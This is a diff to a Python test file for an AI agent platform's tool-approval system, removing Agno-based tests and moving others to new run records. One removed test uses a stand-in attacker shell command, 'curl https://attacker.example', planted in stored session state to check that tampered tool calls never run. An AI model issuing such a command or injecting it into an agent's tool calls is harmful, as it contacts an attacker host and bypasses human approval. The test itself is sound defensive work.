@@ -12,7 +12,7 @@ import asyncio
 import html
 import inspect
 import json
-from contextlib import asynccontextmanager, contextmanager, nullcontext, suppress
+from contextlib import asynccontextmanager, contextmanager, suppress
 from dataclasses import dataclass, field, replace
 from functools import partial
 from itertools import count
@@ -22,16 +22,8 @@ from unittest.mock import AsyncMock, MagicMock, Mock, create_autospec, patch
 
 import nio
 import pytest
-from agno.agent import Agent as AgnoAgent
-from agno.db.base import BaseDb, SessionType
 from agno.media import Image
-from agno.models.message import Message
-from agno.models.response import ToolExecution
-from agno.run.agent import RunOutput
-from agno.run.base import RunContext, RunStatus
-from agno.run.requirement import RunRequirement
-from agno.session.agent import AgentSession
-from agno.tools.function import Function, FunctionCall, UserInputField
+from agno.tools.function import Function, FunctionCall
 from agno.tools.toolkit import Toolkit
 
 from mindroom import agents as agents_module
@@ -45,8 +37,8 @@ from mindroom.agent_cli.session import CliAuthenticationError, CliTurnOwner, Tur
 from mindroom.agent_cli.turn import LiveTurnTools
 from mindroom.ai_runtime import queued_message_signal_context
 from mindroom.approval import receipt as approval_receipt
-from mindroom.approval.response import identify_approval_tools, plan_approval_calls, require_ordered_pause_presentation
-from mindroom.approval.tool_owners import toolkit_owners_for_agents
+from mindroom.approval.receipt import messages_with_approval_receipt
+from mindroom.approval.response import plan_approval_calls, require_ordered_pause_presentation
 from mindroom.authorization import ReplyMembershipPendingError
 from mindroom.background_tasks import wait_for_background_tasks
 from mindroom.cancellation import current_task_is_process_shutdown, request_task_cancel
@@ -56,7 +48,7 @@ from mindroom.config.approval import ApprovalRuleConfig
 from mindroom.config.cold_cache import ColdCacheConfig
 from mindroom.config.main import ResolvedRuntimeModel
 from mindroom.config.mid_turn import MidTurnConfig
-from mindroom.config.models import ModelConfig, ToolConfigEntry
+from mindroom.config.models import ModelConfig
 from mindroom.constants import (
     STREAM_STATUS_APPROVAL_PENDING,
     STREAM_STATUS_CANCELLED,
@@ -65,10 +57,8 @@ from mindroom.constants import (
     STREAM_STATUS_KEY,
     STREAM_STATUS_PENDING,
     STREAM_STATUS_STREAMING,
-    TURN_INTENT_RUN_METADATA_KEY,
 )
 from mindroom.conversation_resolver import ConversationResolver, MessageContext
-from mindroom.delegation.state import DELEGATION_STATE_KEY, DelegationState
 from mindroom.delivery_gateway import (
     DeliveryGateway,
     EditTextRequest,
@@ -96,12 +86,14 @@ from mindroom.event_journal import (
     InboundEvent,
     PrincipalStore,
     ProjectedEvent,
-    approval_arguments_digest,
 )
 from mindroom.event_journal.replies import ReplyStore
 from mindroom.final_delivery import FinalDeliveryOutcome, StreamTransportOutcome
 from mindroom.handled_turns import TurnRecord
+from mindroom.history.storage import new_scope_session
 from mindroom.history.turn_recorder import TurnRecorder
+from mindroom.llm.messages import Message as LoopMessage
+from mindroom.llm.runs import RunRecord, RunRequirement, RunStatus, ToolExecution
 from mindroom.logging_config import get_logger
 from mindroom.matrix import typing as typing_module
 from mindroom.matrix.client import DeliveredMatrixEvent
@@ -140,7 +132,6 @@ from mindroom.response_turn import (
     ResponsePausedForApproval,
     ResponseTurnContext,
     TurnSinks,
-    paused_attempt_from_response,
     run_blocking_response_turn,
     stream_response_turn,
 )
@@ -170,7 +161,6 @@ from mindroom.tool_system.approval_exemptions import register_tool_approval_exem
 from mindroom.tool_system.events import StructuredStreamChunk, ToolTraceEntry, format_tool_started_event
 from mindroom.tool_system.runtime_context import ToolDispatchContext, build_execution_identity_from_runtime_context
 from mindroom.tool_system.worker_routing import ToolExecutionIdentity, serialize_tool_execution_identity
-from mindroom.turn_origin import TurnIntent
 from mindroom.turn_policy import PreparedDispatch
 from tests.approval_continuation_helpers import (
     approval_continuation,
@@ -187,9 +177,9 @@ from tests.conftest import (
     patch_response_runner_module,
     replace_response_runner_deps,
     request_envelope,
+    seed_session,
     unwrap_extracted_collaborator,
 )
-from tests.history_helpers import RecordingModel
 from tests.reply_span_helpers import paused_for_approval, reply_span, response_span
 from tests.response_runner_helpers import (
     _bot,
@@ -2784,445 +2774,6 @@ async def test_approval_pause_keeps_the_reply_correlation_when_the_request_names
     assert continuation.correlation_id == "$question"
 
 
-@pytest.mark.parametrize(("approved", "reason"), [(True, None), (False, "too dangerous")])
-@pytest.mark.asyncio
-async def test_agent_continuation_executes_real_agno_confirmation(  # noqa: PLR0915
-    tmp_path: Path,
-    approved: bool,
-    reason: str | None,
-) -> None:
-    """Exercise the real persisted Agno pause and continuation spine without mocking it."""
-    executed: list[list[str]] = []
-    observed_metadata: list[dict[str, object] | None] = []
-    original_metadata = {
-        "room_id": "!room:localhost",
-        "thread_id": "$thread",
-        "correlation_id": "approval-metadata",
-        # A job follow-up that waits for approval is still one when it resumes.
-        TURN_INTENT_RUN_METADATA_KEY: TurnIntent.JOB_FOLLOW_UP.value,
-    }
-
-    def run_shell_command(args: list[str], run_context: RunContext) -> str:
-        executed.append(args)
-        observed_metadata.append(run_context.metadata)
-        return "ok"
-
-    runner = unwrap_extracted_collaborator(_bot(tmp_path)._response_runner)
-    identity = ToolExecutionIdentity(
-        channel="matrix",
-        agent_name="general",
-        requester_id="@user:localhost",
-        room_id="!room:localhost",
-        thread_id="$thread",
-        resolved_thread_id="$thread",
-        session_id="session-1",
-    )
-    agent = AgnoAgent(
-        id="general",
-        model=SyntheticModel(
-            id="synthetic",
-            seed=1,
-            min_response_chars=20,
-            max_response_chars=20,
-            chars_per_second=0,
-            tool_call_probability=1,
-        ),
-        tools=[
-            Function(
-                name="run_shell_command",
-                entrypoint=run_shell_command,
-                requires_confirmation=True,
-                owning_toolkit="shell",
-            ),
-        ],
-        db=runner.deps.state_writer.create_storage(identity),
-    )
-    paused = await agent.arun(
-        "exercise the tool",
-        session_id="session-1",
-        user_id="@user:localhost",
-        metadata=original_metadata,
-        stream=False,
-    )
-    requirement = (paused.requirements or [])[0]
-    assert requirement.tool_execution is not None
-    tool_call_id = requirement.tool_execution.tool_call_id
-    assert tool_call_id is not None
-    continuation = approval_continuation(
-        approval_id="approval-real-agent",
-        run_id=paused.run_id,
-        calls=(
-            ApprovalCall(
-                tool_call_id=tool_call_id,
-                tool_name="run_shell_command",
-                invoking_agent="general",
-                toolkit_name="shell",
-                expires_at_ns=2**62,
-                arguments_digest=approval_arguments_digest(requirement.tool_execution.tool_args),
-            ),
-        ),
-        execution_identity={},
-        state="claimed",
-    )
-    runner.deps.runtime.config.agents["general"].tools = [ToolConfigEntry(name="shell")]
-    continue_run = MagicMock(wraps=agent.acontinue_run)
-    knowledge = MagicMock()
-    refresh_scheduler = MagicMock()
-    runner.deps.runtime.orchestrator = SimpleNamespace(knowledge_refresh_scheduler=refresh_scheduler)
-
-    tool_trace: list[ToolTraceEntry] = []
-    with (
-        patch.object(
-            runner.deps.knowledge_access,
-            "resolve_for_agent_async",
-            new_callable=AsyncMock,
-            return_value=SimpleNamespace(knowledge=knowledge),
-        ) as resolve_knowledge,
-        patch("mindroom.approval.execution.create_agent", return_value=agent) as create_agent,
-        patch.object(agent, "acontinue_run", new=continue_run),
-        patch("mindroom.approval.execution.typing_indicator", _noop_typing),
-        patch("mindroom.approval.execution.ai_runtime.install_queued_message_notice_hook") as install_notice,
-        patch("mindroom.approval.execution.install_approval_receipt_hooks") as install_receipt,
-        patch("mindroom.approval.execution.ai_runtime.register_queued_notice_storage") as register_notice,
-        approval_receipt.approval_receipt_context("trusted approval receipt"),
-    ):
-        result = await runner._approval_execution.continue_run(
-            continuation,
-            paused_answer=PausedAnswer(
-                text="Before approval.\n\n🔧 `run_shell_command` [1] ⏳",
-                tool_trace=(
-                    ToolTraceEntry(type="tool_call_started", tool_name="run_shell_command", tool_call_id=tool_call_id),
-                ),
-            ),
-            execution_identity=identity,
-            tool_dispatch=ToolDispatchContext(execution_identity=identity),
-            decisions={tool_call_id: approved},
-            denial_reasons={tool_call_id: reason},
-            tool_trace_collector=tool_trace,
-            typing_log_context={},
-            progress=None,
-        )
-
-    assert isinstance(result, CompletedApprovalRun)
-    assert "io.mindroom.ai_run" in result.metadata_content
-    assert bool(executed) is approved
-    assert observed_metadata == ([original_metadata] if approved else [])
-    resolve_knowledge.assert_awaited_once_with("general", execution_identity=identity)
-    assert create_agent.call_args.kwargs["knowledge"] is knowledge
-    assert create_agent.call_args.kwargs["refresh_scheduler"] is refresh_scheduler
-    continued_requirement = continue_run.call_args.kwargs["requirements"][0]
-    assert continue_run.call_args.kwargs["metadata"] == original_metadata
-    assert continue_run.call_args.kwargs["metadata"] is not paused.metadata
-    assert continued_requirement.tool_execution.confirmed is approved
-    assert continued_requirement.tool_execution.confirmation_note == (None if approved else reason)
-    assert continue_run.call_args.kwargs["stream"] is True
-    assert continue_run.call_args.kwargs["stream_events"] is True
-    assert continue_run.call_args.kwargs["yield_run_output"] is True
-    assert result.response_text.startswith("Before approval.\n\n🔧 `run_shell_command` [1]")
-    assert "⏳" not in result.response_text
-    assert [entry.tool_call_id for entry in tool_trace] == [tool_call_id]
-    install_notice.assert_called_once_with(
-        agent.model,
-        notice_text=runner.deps.runtime.config.get_prompt("QUEUED_MESSAGE_NOTICE_TEXT"),
-    )
-    install_receipt.assert_called_once_with(agent.model, agent.fallback_config)
-    register_notice.assert_called_once()
-    assert register_notice.call_args.kwargs["session_id"] == "session-1"
-    assert register_notice.call_args.kwargs["session_type"] is SessionType.AGENT
-    assert register_notice.call_args.kwargs["entity_name"] == "general"
-    assert callable(register_notice.call_args.kwargs["storage_factory"])
-    stored = cast("AgentSession", agent.db.get_session(session_id="session-1", session_type=SessionType.AGENT))
-    assert stored.runs is not None
-    assert stored.runs[-1].metadata == original_metadata
-
-
-@pytest.mark.parametrize(
-    ("mutation", "approved"),
-    [
-        (None, True),
-        ("rewritten", True),
-        ("planted", True),
-        ("planted", False),
-        ("copied", True),
-        ("user_input", True),
-    ],
-)
-@pytest.mark.asyncio
-async def test_agent_continuation_runs_only_approved_calls(
-    tmp_path: Path,
-    mutation: str | None,
-    *,
-    approved: bool,
-) -> None:
-    """Calls rewritten or added in the session store while a card waits must never run under that decision."""
-    executed: list[list[str]] = []
-
-    def run_shell_command(args: list[str]) -> str:
-        executed.append(args)
-        return "ok"
-
-    runner = unwrap_extracted_collaborator(_bot(tmp_path)._response_runner)
-    identity = ToolExecutionIdentity(
-        channel="matrix",
-        agent_name="general",
-        requester_id="@user:localhost",
-        room_id="!room:localhost",
-        thread_id="$thread",
-        resolved_thread_id="$thread",
-        session_id="session-1",
-    )
-    agent = AgnoAgent(
-        id="general",
-        model=SyntheticModel(id="synthetic", seed=1, chars_per_second=0, tool_call_probability=1),
-        tools=[
-            Function(
-                name="run_shell_command",
-                entrypoint=run_shell_command,
-                requires_confirmation=True,
-                owning_toolkit="shell",
-            ),
-        ],
-        db=runner.deps.state_writer.create_storage(identity),
-    )
-    paused = await agent.arun("exercise the tool", session_id="session-1", user_id="@user:localhost", stream=False)
-    captured = paused_attempt_from_response(
-        paused,
-        fallback_session_id="session-1",
-        fallback_run_id=paused.run_id,
-        toolkit_owners=toolkit_owners_for_agents([agent]),
-    )
-    assert captured is not None
-    plan = await plan_approval_calls(
-        identify_approval_tools(captured, default_agent_name="general"),
-        config=runner.deps.runtime.config,
-        runtime_paths=runner.deps.runtime_paths,
-        requester_id="@user:localhost",
-        toolkit_owners=captured.toolkit_owners,
-    )
-    approved_args = (paused.tools or [])[0].tool_args
-    attacker_args = {"args": ["curl", "https://attacker.example"]}
-    if mutation == "rewritten":
-        for tool in (*(paused.tools or ()), *(item.tool_execution for item in paused.requirements or ())):
-            assert tool is not None
-            tool.tool_args = attacker_args
-    elif mutation == "planted":
-        paused.tools = [
-            *(paused.tools or ()),
-            ToolExecution(
-                tool_call_id="planted",
-                tool_name="run_shell_command",
-                tool_args=attacker_args,
-                requires_confirmation=True,
-                confirmed=True,
-            ),
-        ]
-    elif mutation == "copied":
-        # Delegation state routes the run through the delegated driver, which forwards every stored requirement.
-        pending = (paused.requirements or [])[0]
-        copy = RunRequirement.from_dict(pending.to_dict())
-        copy.confirm()
-        paused.tools = []
-        paused.requirements = [pending, copy]
-        paused.metadata = {
-            **(paused.metadata or {}),
-            DELEGATION_STATE_KEY: DelegationState(pending_requirements=[pending.to_dict()]).to_dict(),
-        }
-    elif mutation == "user_input":
-        # The stored call keeps its approved arguments, but answered user input would replace them before it runs.
-        pending = (paused.requirements or [])[0]
-        paused.metadata = {
-            **(paused.metadata or {}),
-            DELEGATION_STATE_KEY: DelegationState(pending_requirements=[pending.to_dict()]).to_dict(),
-        }
-        for tool in (*(paused.tools or ()), *(item.tool_execution for item in paused.requirements or ())):
-            assert tool is not None
-            tool.requires_confirmation = False
-            tool.requires_user_input = True
-            tool.answered = True
-            tool.user_input_schema = [UserInputField(name="args", field_type=list, value=attacker_args["args"])]
-    agent.db.upsert_run(paused, session_id="session-1")
-    continuation = approval_continuation(
-        approval_id="approval-rewritten",
-        run_id=paused.run_id,
-        calls=plan.calls,
-        execution_identity={},
-        state="claimed",
-    )
-    runner.deps.runtime.config.agents["general"].tools = [ToolConfigEntry(name="shell")]
-
-    with (
-        patch.object(
-            runner.deps.knowledge_access,
-            "resolve_for_agent_async",
-            new_callable=AsyncMock,
-            return_value=SimpleNamespace(knowledge=None),
-        ),
-        patch("mindroom.approval.execution.create_agent", return_value=agent),
-        patch("mindroom.approval.execution.typing_indicator", _noop_typing),
-        pytest.raises(RuntimeError, match=r"arguments|does not cover") if mutation else nullcontext(),
-    ):
-        await runner._approval_execution.continue_run(
-            continuation,
-            paused_answer=PausedAnswer(),
-            execution_identity=identity,
-            tool_dispatch=ToolDispatchContext(execution_identity=identity),
-            decisions={call.tool_call_id: approved for call in plan.calls},
-            denial_reasons={call.tool_call_id: None for call in plan.calls},
-            tool_trace_collector=[],
-            typing_log_context={},
-            progress=None,
-        )
-
-    assert executed == ([] if mutation else [approved_args["args"]])
-
-
-@pytest.mark.parametrize(
-    ("persisted_call_ids", "decision_call_ids"),
-    [
-        pytest.param((None,), ("call-1",), id="missing"),
-        pytest.param(("call-1", "call-1"), ("call-1",), id="duplicate"),
-        pytest.param(("call-1",), ("call-1", "call-extra"), id="extra"),
-        pytest.param(("call-new",), ("call-stale",), id="stale"),
-    ],
-)
-@pytest.mark.asyncio
-async def test_agent_continuation_rejects_non_exact_persisted_call_ids(
-    tmp_path: Path,
-    persisted_call_ids: tuple[str | None, ...],
-    decision_call_ids: tuple[str, ...],
-) -> None:
-    """A malformed persisted pause must never reach Agno continuation execution."""
-    runner = unwrap_extracted_collaborator(_bot(tmp_path)._response_runner)
-    requirements = [
-        RunRequirement(
-            ToolExecution(
-                tool_call_id=call_id,
-                tool_name="dangerous",
-                requires_confirmation=True,
-            ),
-        )
-        for call_id in persisted_call_ids
-    ]
-    persisted = RunOutput(
-        run_id="run-1",
-        agent_id="general",
-        session_id="session-1",
-        status=RunStatus.paused,
-        requirements=requirements,
-    )
-    agent = MagicMock()
-    agent.acontinue_run = AsyncMock(
-        return_value=RunOutput(
-            run_id="run-1",
-            session_id="session-1",
-            status=RunStatus.completed,
-        ),
-    )
-    identity = ToolExecutionIdentity(
-        channel="matrix",
-        agent_name="general",
-        requester_id="@user:localhost",
-        room_id="!room:localhost",
-        thread_id="$thread",
-        resolved_thread_id="$thread",
-        session_id="session-1",
-    )
-    storage = runner.deps.state_writer.create_storage(identity)
-    storage.upsert_session(AgentSession(session_id="session-1", agent_id="general", user_id="@user:localhost"))
-    storage.upsert_run(run=persisted, session_id="session-1", user_id="@user:localhost")
-    continuation = approval_continuation(
-        approval_id="approval-invalid-agent",
-        execution_identity={},
-        state="claimed",
-    )
-    decisions = dict.fromkeys(decision_call_ids, True)
-    denial_reasons = dict.fromkeys(decision_call_ids)
-
-    with (
-        patch.object(
-            runner.deps.knowledge_access,
-            "resolve_for_agent_async",
-            new_callable=AsyncMock,
-            return_value=SimpleNamespace(knowledge=MagicMock()),
-        ),
-        patch("mindroom.approval.execution.create_agent", return_value=agent),
-        pytest.raises(RuntimeError, match="no longer match the approval continuation"),
-    ):
-        await runner._approval_execution.continue_run(
-            continuation,
-            paused_answer=PausedAnswer(),
-            execution_identity=identity,
-            tool_dispatch=ToolDispatchContext(execution_identity=identity),
-            decisions=decisions,
-            denial_reasons=denial_reasons,
-            tool_trace_collector=[],
-            typing_log_context={},
-            progress=None,
-        )
-
-    agent.acontinue_run.assert_not_awaited()
-
-
-@pytest.mark.asyncio
-async def test_agent_continuation_closes_runtime_when_notice_hook_setup_fails(tmp_path: Path) -> None:
-    """Reconstructed storage must close even if pre-continuation model setup raises."""
-    runner = unwrap_extracted_collaborator(_bot(tmp_path)._response_runner)
-    storage = MagicMock(spec=BaseDb)
-    storage.get_session.return_value = AgentSession(
-        session_id="session-1",
-        agent_id="general",
-        user_id="@user:localhost",
-        runs=[RunOutput(run_id="run-1", agent_id="general", session_id="session-1", status=RunStatus.paused)],
-    )
-    agent = MagicMock()
-    agent.model = MagicMock()
-    identity = ToolExecutionIdentity(
-        channel="matrix",
-        agent_name="general",
-        requester_id="@user:localhost",
-        room_id="!room:localhost",
-        thread_id="$thread",
-        resolved_thread_id="$thread",
-        session_id="session-1",
-    )
-    continuation = approval_continuation(
-        approval_id="approval-hook-error",
-        execution_identity={},
-        state="claimed",
-    )
-
-    with (
-        patch.object(
-            runner.deps.knowledge_access,
-            "resolve_for_agent_async",
-            new_callable=AsyncMock,
-            return_value=SimpleNamespace(knowledge=MagicMock()),
-        ),
-        patch("mindroom.approval.execution.create_session_storage", return_value=storage),
-        patch("mindroom.approval.execution.create_agent", return_value=agent),
-        patch(
-            "mindroom.approval.execution.ai_runtime.install_queued_message_notice_hook",
-            side_effect=RuntimeError("hook setup failed"),
-        ),
-        patch("mindroom.approval.execution.close_agent_runtime_state_dbs") as close_runtime,
-        pytest.raises(RuntimeError, match="hook setup failed"),
-    ):
-        await runner._approval_execution.continue_run(
-            continuation,
-            paused_answer=PausedAnswer(),
-            execution_identity=identity,
-            tool_dispatch=ToolDispatchContext(execution_identity=identity),
-            decisions={},
-            denial_reasons={},
-            tool_trace_collector=[],
-            typing_log_context={},
-            progress=None,
-        )
-
-    close_runtime.assert_called_once_with(agent, shared_scope_storage=storage)
-    storage.close.assert_called_once_with()
-
-
 @pytest.mark.asyncio
 async def test_approval_collaborators_read_live_config_after_hot_reload(tmp_path: Path) -> None:
     """Unchanged bots must apply reloaded approval policy and agent configuration."""
@@ -3267,12 +2818,17 @@ async def test_approval_collaborators_read_live_config_after_hot_reload(tmp_path
     )
 
     storage = runner.deps.state_writer.create_storage(identity)
-    storage.upsert_session(AgentSession(session_id="session-1", agent_id="general", user_id="@user:localhost"))
-    storage.upsert_run(
-        run=RunOutput(run_id="run-1", agent_id="general", session_id="session-1", status=RunStatus.paused),
-        session_id="session-1",
-        user_id="@user:localhost",
-    )
+    session = new_scope_session(session_id="session-1", scope_id="general", is_team=False)
+    session.runs = [
+        RunRecord(
+            run_id="run-1",
+            session_id="session-1",
+            agent_id="general",
+            user_id="@user:localhost",
+            status=RunStatus.paused,
+        ),
+    ]
+    seed_session(storage, session)
 
     def create_from_live_config(_name: str, config: object, *_args: object, **_kwargs: object) -> None:
         assert config is reloaded
@@ -5143,15 +4699,13 @@ async def test_continuation_tool_dispatch_preserves_original_correlation_id(tmp_
 
     async def continue_run(*_args: object, **kwargs: object) -> CompletedApprovalRun:
         forwarded_progress.append(kwargs["progress"])
-        model = RecordingModel(id="approval-receipt", provider="fake")
-        approval_receipt.install_approval_receipt_hooks(model, None)
-        await model.aresponse(
-            messages=[
-                Message(role="system", content="base rules"),
-                Message(role="tool", content="published"),
-            ],
+        receipt = approval_receipt._context.get()
+        assert receipt is not None
+        projected = messages_with_approval_receipt(
+            [LoopMessage(role="system", content="base rules"), LoopMessage(role="tool", content="published")],
+            receipt.receipt_text,
         )
-        model_messages.extend((message.role, message.content) for message in model.seen_messages)
+        model_messages.extend((message.role, message.content) for message in projected)
         return CompletedApprovalRun(response_text="done", metadata_content={})
 
     with (
